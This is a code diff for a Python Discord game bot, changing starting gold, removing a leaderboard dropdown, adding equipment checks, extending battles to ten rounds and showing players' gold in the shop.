@@ -134,7 +134,7 @@ class ConfirmFreak(discord.ui.View):
         self.stop()
 
         mycursor.execute("INSERT INTO Users (userID, gold, freak, hunted, hd, sb, o, ss, ih, pa, rn, ma, eh, vv, d ,tb) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)",
-                         (self.ctx.author.id, 0, self.freakyid, False, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
+                         (self.ctx.author.id, 2000, self.freakyid, False, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
         mydb.commit()
 
         await self.msg.edit(view=self)
@@ -157,132 +157,6 @@ class ConfirmFreak(discord.ui.View):
     async def on_timeout(self):
         if self.msg:
             await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/pickfreak <freak>` to pick your own Freak again.**", color=embedcolor), view=None)
-
-
-class LeaderboardDropdown(discord.ui.Select):
-    def __init__(self):
-
-        options = [
-            discord.SelectOption(label='Page 1'),
-            discord.SelectOption(label='Page 2'),
-            discord.SelectOption(label='Page 3'),
-            discord.SelectOption(label='Page 4'),
-            discord.SelectOption(label='Page 5'),
-            discord.SelectOption(label='Page 6'),
-            discord.SelectOption(label='Page 7'),
-            discord.SelectOption(label='Page 8'),
-            discord.SelectOption(label='Page 9'),
-            discord.SelectOption(label='Page 10'),
-        ]
-
-        super().__init__(placeholder='Please select a page...', min_values=1, max_values=1, options=options)
-
-    async def callback(self, interaction: discord.Interaction):
-        while len(self.view.enddescription) < 10:
-            self.view.enddescription.append("`No users available...`")
-
-        if self.values[0] == 'Page 1':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[0], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 2':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[1], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 3':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[2], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 4':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[3], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 5':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[4], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 6':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[5], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 7':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[6], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 8':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[7], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 9':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[8], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-        elif self.values[0] == 'Page 10':
-            leaderboardembed = discord.Embed(
-                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[9], color=embedcolor)
-            leaderboardembed.set_thumbnail(url=pfpurl)
-            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
-            leaderboardembed.timestamp = discord.utils.utcnow()
-
-            await interaction.response.edit_message(embed=leaderboardembed)
-
-
-class LeaderboardDropdownView(discord.ui.View):
-    def __init__(self, enddescription):
-        super().__init__()
-        self.msg = None
-        self.enddescription = enddescription
-
-        self.add_item(LeaderboardDropdown())
-
-    async def on_timeout(self):
-        if self.msg:
-            await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/leaderboard` to see the leaderboard again.**", color=embedcolor), view=None)
 
 
 class RoleLeaderboardDropdown(discord.ui.Select):
@@ -346,6 +220,8 @@ class RoleLeaderboardDropdown(discord.ui.Select):
                 name="Whitelist", value=self.view.whitelistfields[2], inline=False)
             leaderboardembed.add_field(
                 name="Peasants ", value=self.view.peasantfields[2], inline=False)
+
+            await interaction.response.edit_message(embed=leaderboardembed)
 
         elif self.values[0] == 'Page 4':
             leaderboardembed = discord.Embed(
@@ -1875,9 +1751,59 @@ class Equip(discord.ui.View):
         self.clear_items()
         self.stop()
 
-        view = EquipDropDownView(self.ctx, "equipment1")
-        await interaction.response.edit_message(view=view)
-        view.msg = await interaction.original_message()
+        mycursor.execute("SELECT hd,sb,o,ss,ih,pa,rn,ma,eh,vv,d,tb FROM Users WHERE userID=%(userID)s",
+                         {'userID': self.ctx.author.id})
+
+        for item in mycursor:
+            if item[0] < 1 and item[1] < 1 and item[2] < 1 and item[3] < 1 and item[4] < 1 and item[5] < 1 and item[6] < 1 and item[7] < 1 and item[8] < 1 and item[9] < 1 and item[10] < 1 and item[11] < 1:
+                mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
+                                 {'userID': interaction.user.id})
+
+                for x in mycursor:
+                    equipments = []
+                    for equipment in x:
+                        if equipment == "HD":
+                            equipments.append("Hidden Dagger")
+                        elif equipment == "SB":
+                            equipments.append("Standard Blade")
+                        elif equipment == "O":
+                            equipments.append("Ooze")
+                        elif equipment == "SS":
+                            equipments.append("Standard Shield")
+                        elif equipment == "IH":
+                            equipments.append("Iron Helmet")
+                        elif equipment == "PA":
+                            equipments.append("Platinum Armour")
+                        elif equipment == "RN":
+                            equipments.append("Rune Necklace")
+                        elif equipment == "MA":
+                            equipments.append("Mystic Artifact")
+                        elif equipment == "EH":
+                            equipments.append("Enchanted Headpiece")
+                        elif equipment == "VV":
+                            equipments.append("Vital Vial")
+                        elif equipment == "D":
+                            equipments.append("Deathspike")
+                        elif equipment == "TB":
+                            equipments.append("Tea Bag")
+                        elif equipment == None:
+                            equipments.append("None equipped")
+
+                embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
+                                      description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You don't have any equipment!**", color=embedcolor)
+                embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
+                embed.set_author(name=interaction.user.name,
+                                 icon_url=interaction.user.avatar.url)
+                embed.timestamp = discord.utils.utcnow()
+
+                view = Equip(self.ctx)
+                await interaction.response.edit_message(embed=embed, view=view)
+                view.msg = await interaction.original_message()
+
+            else:
+                view = EquipDropDownView(self.ctx, "equipment1")
+                await interaction.response.edit_message(view=view)
+                view.msg = await interaction.original_message()
 
     @discord.ui.button(label='Change Equipment 2', style=discord.ButtonStyle.blurple)
     async def equipment2(self, button: discord.ui.Button, interaction: discord.Interaction):
@@ -1888,9 +1814,59 @@ class Equip(discord.ui.View):
         self.clear_items()
         self.stop()
 
-        view = EquipDropDownView(self.ctx, "equipment2")
-        await interaction.response.edit_message(view=view)
-        view.msg = await interaction.original_message()
+        mycursor.execute("SELECT hd,sb,o,ss,ih,pa,rn,ma,eh,vv,d,tb FROM Users WHERE userID=%(userID)s",
+                         {'userID': self.ctx.author.id})
+
+        for item in mycursor:
+            if item[0] < 1 and item[1] < 1 and item[2] < 1 and item[3] < 1 and item[4] < 1 and item[5] < 1 and item[6] < 1 and item[7] < 1 and item[8] < 1 and item[9] < 1 and item[10] < 1 and item[11] < 1:
+                mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
+                                 {'userID': interaction.user.id})
+
+                for x in mycursor:
+                    equipments = []
+                    for equipment in x:
+                        if equipment == "HD":
+                            equipments.append("Hidden Dagger")
+                        elif equipment == "SB":
+                            equipments.append("Standard Blade")
+                        elif equipment == "O":
+                            equipments.append("Ooze")
+                        elif equipment == "SS":
+                            equipments.append("Standard Shield")
+                        elif equipment == "IH":
+                            equipments.append("Iron Helmet")
+                        elif equipment == "PA":
+                            equipments.append("Platinum Armour")
+                        elif equipment == "RN":
+                            equipments.append("Rune Necklace")
+                        elif equipment == "MA":
+                            equipments.append("Mystic Artifact")
+                        elif equipment == "EH":
+                            equipments.append("Enchanted Headpiece")
+                        elif equipment == "VV":
+                            equipments.append("Vital Vial")
+                        elif equipment == "D":
+                            equipments.append("Deathspike")
+                        elif equipment == "TB":
+                            equipments.append("Tea Bag")
+                        elif equipment == None:
+                            equipments.append("None equipped")
+
+                embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
+                                      description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You don't have any equipment!**", color=embedcolor)
+                embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
+                embed.set_author(name=interaction.user.name,
+                                 icon_url=interaction.user.avatar.url)
+                embed.timestamp = discord.utils.utcnow()
+
+                view = Equip(self.ctx)
+                await interaction.response.edit_message(embed=embed, view=view)
+                view.msg = await interaction.original_message()
+
+            else:
+                view = EquipDropDownView(self.ctx, "equipment2")
+                await interaction.response.edit_message(view=view)
+                view.msg = await interaction.original_message()
 
     @discord.ui.button(label='Change Equipment 3', style=discord.ButtonStyle.blurple)
     async def equipment3(self, button: discord.ui.Button, interaction: discord.Interaction):
@@ -1901,9 +1877,59 @@ class Equip(discord.ui.View):
         self.clear_items()
         self.stop()
 
-        view = EquipDropDownView(self.ctx, "equipment3")
-        await interaction.response.edit_message(view=view)
-        view.msg = await interaction.original_message()
+        mycursor.execute("SELECT hd,sb,o,ss,ih,pa,rn,ma,eh,vv,d,tb FROM Users WHERE userID=%(userID)s",
+                         {'userID': self.ctx.author.id})
+
+        for item in mycursor:
+            if item[0] < 1 and item[1] < 1 and item[2] < 1 and item[3] < 1 and item[4] < 1 and item[5] < 1 and item[6] < 1 and item[7] < 1 and item[8] < 1 and item[9] < 1 and item[10] < 1 and item[11] < 1:
+                mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
+                                 {'userID': interaction.user.id})
+
+                for x in mycursor:
+                    equipments = []
+                    for equipment in x:
+                        if equipment == "HD":
+                            equipments.append("Hidden Dagger")
+                        elif equipment == "SB":
+                            equipments.append("Standard Blade")
+                        elif equipment == "O":
+                            equipments.append("Ooze")
+                        elif equipment == "SS":
+                            equipments.append("Standard Shield")
+                        elif equipment == "IH":
+                            equipments.append("Iron Helmet")
+                        elif equipment == "PA":
+                            equipments.append("Platinum Armour")
+                        elif equipment == "RN":
+                            equipments.append("Rune Necklace")
+                        elif equipment == "MA":
+                            equipments.append("Mystic Artifact")
+                        elif equipment == "EH":
+                            equipments.append("Enchanted Headpiece")
+                        elif equipment == "VV":
+                            equipments.append("Vital Vial")
+                        elif equipment == "D":
+                            equipments.append("Deathspike")
+                        elif equipment == "TB":
+                            equipments.append("Tea Bag")
+                        elif equipment == None:
+                            equipments.append("None equipped")
+
+                embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
+                                      description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You don't have any equipment!**", color=embedcolor)
+                embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
+                embed.set_author(name=interaction.user.name,
+                                 icon_url=interaction.user.avatar.url)
+                embed.timestamp = discord.utils.utcnow()
+
+                view = Equip(self.ctx)
+                await interaction.response.edit_message(embed=embed, view=view)
+                view.msg = await interaction.original_message()
+
+            else:
+                view = EquipDropDownView(self.ctx, "equipment3")
+                await interaction.response.edit_message(view=view)
+                view.msg = await interaction.original_message()
 
     @discord.ui.button(label='Unequip Equipment 1', style=discord.ButtonStyle.red)
     async def un1(self, button: discord.ui.Button, interaction: discord.Interaction):
@@ -2118,6 +2144,15 @@ class BattleDropdown(discord.ui.Select):
         elif self.player == 2 and interaction.user != self.view.opponent:
             await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.view.opponent.mention}!**", color=embedcolor), ephemeral=True)
             return
+
+        oldp1health = self.view.p1health
+        oldp2health = self.view.p2health
+        oldp1defense = self.view.p1defense
+        oldp2defense = self.view.p2defense
+        oldp1lowaccuracy = self.view.p1lowaccuracy
+        oldp2lowaccuracy = self.view.p2lowaccuracy
+        oldp1highaccuracy = self.view.p1highaccuracy
+        oldp2highaccuracy = self.view.p2highaccuracy
 
         if interaction.user == self.view.ctx.author and not self.view.p1responded:
             if self.view.p1freakyid == "V":
@@ -2346,6 +2381,14 @@ class BattleDropdown(discord.ui.Select):
                 else:
                     draw = True
 
+            elif self.view.round == 10 and self.view.p1responded and self.view.p2responded:
+                if self.view.p1health < self.view.p2health:
+                    p1win = False
+                elif self.view.p1health > self.view.p2health:
+                    p1win = True
+                else:
+                    draw = True
+
             elif self.view.p1health <= 0 and self.view.p1responded and self.view.p2responded:
                 p1win = False
 
@@ -2353,13 +2396,15 @@ class BattleDropdown(discord.ui.Select):
                 p1win = True
 
             if self.view.p1responded and self.view.p2responded and p1win == None:
+                self.view.stop()
+                self.view.clear_items()
 
                 self.view.round += 1
 
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=self.view.actionperformed, color=embedcolor)
                 embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
-                embed.set_author(name=f"Round {self.view.round} of 7",
+                embed.set_author(name=f"Round {self.view.round} of 10",
                                  icon_url=self.view.ctx.guild.icon.url)
                 embed.timestamp = discord.utils.utcnow()
                 embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
@@ -2380,6 +2425,9 @@ class BattleDropdown(discord.ui.Select):
                 view.msg = await interaction.original_message()
 
             elif self.view.p1responded and self.view.p2responded and draw:
+                self.view.stop()
+                self.view.clear_items()
+
                 mycursor.execute("UPDATE Users SET gold = gold + 100 WHERE userID=%(userID)s",
                                  {'userID': self.view.opponent.id})
                 mycursor.execute("UPDATE Users SET gold = gold + 100 WHERE userID=%(userID)s",
@@ -2388,36 +2436,39 @@ class BattleDropdown(discord.ui.Select):
 
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} drew with {self.view.opponent.display_name}!", description="You have both been granted 100 Gold for your valiant efforts!", color=embedcolor)
-                embed.set_footer(text=footertext, icon_url=self.winner.guild.icon.url)
-                embed.set_author(name=f"{self.winner.display_name}",
-                                 icon_url=self.winner.avatar.url)
+                embed.set_footer(text=footertext, icon_url=interaction.guild.icon.url)
+                embed.set_author(name=f"Round {self.view.round} of 10 - Draw!",
+                                 icon_url=interaction.guild.icon.url)
                 embed.timestamp = discord.utils.utcnow()
-                embed.set_thumbnail(url=self.winner.guild.icon.url)
+                embed.set_thumbnail(url=interaction.guild.icon.url)
                 embed.add_field(
                     name="Logged Changes", value=f"`+100 Gold` for {self.view.ctx.author.display_name}\n`+100 Gold` for {self.view.opponent.display_name}")
 
-                await interaction.response.edit_message(embed=embed)
+                await interaction.response.edit_message(embed=embed, view=self.view)
 
             elif p1win == None:
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=f"{self.view.ctx.author.mention} used a skill. Waiting for {self.view.opponent.mention} to use a skill...", color=embedcolor)
                 embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
-                embed.set_author(name=f"Round {self.view.round} of 7",
+                embed.set_author(name=f"Round {self.view.round} of 10",
                                  icon_url=self.view.ctx.guild.icon.url)
                 embed.timestamp = discord.utils.utcnow()
                 embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
                 embed.add_field(name=self.view.p1freak,
-                                value=f"Health \U00002764 - `{self.view.p1health}`\nDefense \U0001f6e1 - `{self.view.p1defense}`\nAccuracy for Low Attacks - `{self.view.p1lowaccuracy}`\nAccuracy for High Attacks - `{self.view.p1highaccuracy}`")
+                                value=f"Health \U00002764 - `{oldp1health}`\nDefense \U0001f6e1 - `{oldp1defense}`\nAccuracy for Low Attacks - `{oldp1lowaccuracy}`\nAccuracy for High Attacks - `{oldp1highaccuracy}`")
                 embed.add_field(name=self.view.p2freak,
-                                value=f"Health \U00002764 - `{self.view.p2health}`\nDefense \U0001f6e1 - `{self.view.p2defense}`\nAccuracy for Low Attacks - `{self.view.p2lowaccuracy}`\nAccuracy for High Attacks - `{self.view.p2highaccuracy}`")
+                                value=f"Health \U00002764 - `{oldp2health}`\nDefense \U0001f6e1 - `{oldp2defense}`\nAccuracy for Low Attacks - `{oldp2lowaccuracy}`\nAccuracy for High Attacks - `{oldp2highaccuracy}`")
 
                 await interaction.response.edit_message(embed=embed)
 
             elif p1win:
+                self.view.stop()
+                self.view.clear_items()
+
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=self.view.actionperformed+f"\n\n**{self.view.ctx.author.display_name} wins as {self.view.opponent.display_name} is no longer able to fight!**", color=embedcolor)
                 embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
-                embed.set_author(name=f"Congratulations {self.view.ctx.author.display_name}!",
+                embed.set_author(name=f"Round {self.view.round} of 10 - Congratulations {self.view.ctx.author.display_name}!",
                                  icon_url=self.view.ctx.author.avatar.url)
                 embed.timestamp = discord.utils.utcnow()
                 embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
@@ -2434,10 +2485,13 @@ class BattleDropdown(discord.ui.Select):
                 view.msg = await interaction.original_message()
 
             elif not p1win:
+                self.view.stop()
+                self.view.clear_items()
+
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=self.view.actionperformed+f"\n\n**{self.view.opponent.display_name} wins as {self.view.ctx.author.display_name} is no longer able to fight!**", color=embedcolor)
                 embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
-                embed.set_author(name=f"Congratulations {self.view.opponent.display_name}!",
+                embed.set_author(name=f"Round {self.view.round} of 10 - Congratulations {self.view.opponent.display_name}!",
                                  icon_url=self.view.opponent.avatar.url)
                 embed.timestamp = discord.utils.utcnow()
                 embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
@@ -2680,6 +2734,14 @@ class BattleDropdown(discord.ui.Select):
                 else:
                     draw = True
 
+            elif self.view.round == 10 and self.view.p1responded and self.view.p2responded:
+                if self.view.p1health < self.view.p2health:
+                    p1win = False
+                elif self.view.p1health > self.view.p2health:
+                    p1win = True
+                else:
+                    draw = True
+
             elif self.view.p1health <= 0 and self.view.p1responded and self.view.p2responded:
                 p1win = False
 
@@ -2687,13 +2749,15 @@ class BattleDropdown(discord.ui.Select):
                 p1win = True
 
             if self.view.p1responded and self.view.p2responded and p1win == None:
+                self.view.stop()
+                self.view.clear_items()
 
                 self.view.round += 1
 
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=self.view.actionperformed, color=embedcolor)
                 embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
-                embed.set_author(name=f"Round {self.view.round} of 7",
+                embed.set_author(name=f"Round {self.view.round} of 10",
                                  icon_url=self.view.ctx.guild.icon.url)
                 embed.timestamp = discord.utils.utcnow()
                 embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
@@ -2714,6 +2778,9 @@ class BattleDropdown(discord.ui.Select):
                 view.msg = await interaction.original_message()
 
             elif self.view.p1responded and self.view.p2responded and draw:
+                self.view.stop()
+                self.view.clear_items()
+
                 mycursor.execute("UPDATE Users SET gold = gold + 100 WHERE userID=%(userID)s",
                                  {'userID': self.view.opponent.id})
                 mycursor.execute("UPDATE Users SET gold = gold + 100 WHERE userID=%(userID)s",
@@ -2722,36 +2789,39 @@ class BattleDropdown(discord.ui.Select):
 
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} drew with {self.view.opponent.display_name}!", description="You have both been granted 100 Gold for your valiant efforts!", color=embedcolor)
-                embed.set_footer(text=footertext, icon_url=self.winner.guild.icon.url)
-                embed.set_author(name=f"{self.winner.display_name}",
-                                 icon_url=self.winner.avatar.url)
+                embed.set_footer(text=footertext, icon_url=interaction.guild.icon.url)
+                embed.set_author(name=f"Round {self.view.round} of 10 - Draw!",
+                                 icon_url=interaction.guild.icon.url)
                 embed.timestamp = discord.utils.utcnow()
-                embed.set_thumbnail(url=self.winner.guild.icon.url)
+                embed.set_thumbnail(url=interaction.guild.icon.url)
                 embed.add_field(
                     name="Logged Changes", value=f"`+100 Gold` for {self.view.ctx.author.display_name}\n`+100 Gold` for {self.view.opponent.display_name}")
 
-                await interaction.response.edit_message(embed=embed)
+                await interaction.response.edit_message(embed=embed, view=self.view)
 
             elif p1win == None:
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=f"{self.view.opponent.mention} used a skill. Waiting for {self.view.ctx.author.mention} to use a skill...", color=embedcolor)
                 embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
-                embed.set_author(name=f"Round {self.view.round} of 7",
+                embed.set_author(name=f"Round {self.view.round} of 10",
                                  icon_url=self.view.ctx.guild.icon.url)
                 embed.timestamp = discord.utils.utcnow()
                 embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
                 embed.add_field(name=self.view.p1freak,
-                                value=f"Health \U00002764 - `{self.view.p1health}`\nDefense \U0001f6e1 - `{self.view.p1defense}`\nAccuracy for Low Attacks - `{self.view.p1lowaccuracy}`\nAccuracy for High Attacks - `{self.view.p1highaccuracy}`")
+                                value=f"Health \U00002764 - `{oldp1health}`\nDefense \U0001f6e1 - `{oldp1defense}`\nAccuracy for Low Attacks - `{oldp1lowaccuracy}`\nAccuracy for High Attacks - `{oldp1highaccuracy}`")
                 embed.add_field(name=self.view.p2freak,
-                                value=f"Health \U00002764 - `{self.view.p2health}`\nDefense \U0001f6e1 - `{self.view.p2defense}`\nAccuracy for Low Attacks - `{self.view.p2lowaccuracy}`\nAccuracy for High Attacks - `{self.view.p2highaccuracy}`")
+                                value=f"Health \U00002764 - `{oldp2health}`\nDefense \U0001f6e1 - `{oldp2defense}`\nAccuracy for Low Attacks - `{oldp2lowaccuracy}`\nAccuracy for High Attacks - `{oldp2highaccuracy}`")
 
                 await interaction.response.edit_message(embed=embed)
 
             elif p1win:
+                self.view.stop()
+                self.view.clear_items()
+
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=self.view.actionperformed+f"\n\n**{self.view.ctx.author.display_name} wins as {self.view.opponent.display_name} is no longer able to fight!**", color=embedcolor)
                 embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
-                embed.set_author(name=f"Congratulations {self.view.ctx.author.display_name}!",
+                embed.set_author(name=f"Round {self.view.round} of 10 - Congratulations {self.view.ctx.author.display_name}!",
                                  icon_url=self.view.ctx.author.avatar.url)
                 embed.timestamp = discord.utils.utcnow()
                 embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
@@ -2768,10 +2838,13 @@ class BattleDropdown(discord.ui.Select):
                 view.msg = await interaction.original_message()
 
             elif not p1win:
+                self.view.stop()
+                self.view.clear_items()
+
                 embed = discord.Embed(
                     title=f"{self.view.ctx.author.display_name} vs {self.view.opponent.display_name}", description=self.view.actionperformed+f"\n\n**{self.view.opponent.display_name} wins as {self.view.ctx.author.display_name} is no longer able to fight!**", color=embedcolor)
                 embed.set_footer(text=footertext, icon_url=self.view.ctx.guild.icon.url)
-                embed.set_author(name=f"Congratulations {self.view.opponent.display_name}!",
+                embed.set_author(name=f"Round {self.view.round} of 10 - Congratulations {self.view.opponent.display_name}!",
                                  icon_url=self.view.opponent.avatar.url)
                 embed.timestamp = discord.utils.utcnow()
                 embed.set_thumbnail(url=self.view.ctx.guild.icon.url)
@@ -3241,7 +3314,7 @@ class ConfirmBattle(discord.ui.View):
         embed = discord.Embed(
             title=f"{self.ctx.author.display_name} vs {self.opponent.display_name}", color=embedcolor)
         embed.set_footer(text=footertext, icon_url=self.ctx.guild.icon.url)
-        embed.set_author(name=f"Round 1 of 7",
+        embed.set_author(name=f"Round 1 of 10",
                          icon_url=self.ctx.author.avatar.url)
         embed.timestamp = discord.utils.utcnow()
         embed.set_thumbnail(url=self.ctx.guild.icon.url)
@@ -3320,14 +3393,21 @@ class ConfirmPurchase(discord.ui.View):
         self.clear_items()
         self.stop()
 
-        await self.msg.edit(view=self)
-
         embed = discord.Embed(title=f"Shop",
                               description="Welcome to the shop fellow Freaks! I have a lot of items that I need to sell - would you like to buy any of these from me?", color=embedcolor)
         embed.set_footer(text=footertext, icon_url=interaction.guild.icon.url)
         embed.set_author(name=interaction.user.display_name, icon_url=interaction.user.avatar.url)
         embed.set_thumbnail(url=interaction.guild.icon.url)
         embed.timestamp = discord.utils.utcnow()
+        mycursor.execute("SELECT gold FROM Users WHERE userID=%(userID)s",
+                         {'userID': interaction.user.id})
+
+        for x in mycursor:
+            gold = x[0]
+
+        embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                        value=f"`{gold} Gold`", inline=False)
+
         embed.add_field(name=f"Hidden Dagger - {hdcost} Gold",
                         value=f"Grants `+{hd} Attack Damage` to High Attacks", inline=False)
         embed.add_field(name=f"Standard Blade - {sbcost} Gold",
@@ -3402,14 +3482,22 @@ class ShopDropdown(discord.ui.Select):
             await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.view.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
             return
 
+        mycursor.execute("SELECT gold FROM Users WHERE userID=%(userID)s",
+                         {'userID': interaction.user.id})
+
+        for x in mycursor:
+            gold = x[0]
+
         if self.values[0] == f'Hidden Dagger - {hdcost} Gold':
             embed = discord.Embed(
                 title=self.values[0], description=f"Grants `+{hd} Attack Damage` to High Attacks", color=embedcolor)
             embed.set_footer(text=footertext, icon_url=interaction.guild.icon.url)
             embed.set_author(name=interaction.user.display_name,
                              icon_url=interaction.user.avatar.url)
-#             embed.set_thumbnail(url=hdimgurl)
+            embed.set_thumbnail(url=hdimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = hdcost
             item = "hd"
@@ -3421,8 +3509,10 @@ class ShopDropdown(discord.ui.Select):
             embed.set_footer(text=footertext, icon_url=interaction.guild.icon.url)
             embed.set_author(name=interaction.user.display_name,
                              icon_url=interaction.user.avatar.url)
-#             embed.set_thumbnail(url=sbimgurl)
+            embed.set_thumbnail(url=sbimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = sbcost
             item = "sb"
@@ -3436,6 +3526,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=oimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = ocost
             item = "o"
@@ -3449,6 +3541,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=ssimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = sscost
             item = "ss"
@@ -3462,6 +3556,8 @@ class ShopDropdown(discord.ui.Select):
                              icon_url=interaction.user.avatar.url)
             embed.set_thumbnail(url=ihimgurl)
             embed.timestamp = discord.utils.utcnow()
+            embed.add_field(name=f"{interaction.user.display_name}'s Gold",
+                            value=f"`{gold} Gold`", inline=False)
 
             cost = ihcost
             item = "ih"
